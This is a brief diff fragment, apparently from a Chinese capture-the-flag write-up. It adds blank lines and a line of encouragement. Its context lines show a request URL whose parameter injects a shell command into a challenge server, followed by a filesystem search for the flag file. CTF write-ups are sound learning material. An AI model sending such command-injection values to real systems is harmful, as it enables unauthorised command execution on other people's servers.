@@ -44,5 +44,11 @@ http://117.50.3.97:8004/?url=file:bash%20a|&filename=dadsdasd
 find / -iname 'flag*'
 就可以找到flag再/tmp目录下
 ```
+  
+  
+  
+ 
+ 
+你可一定要加油啊
 
 
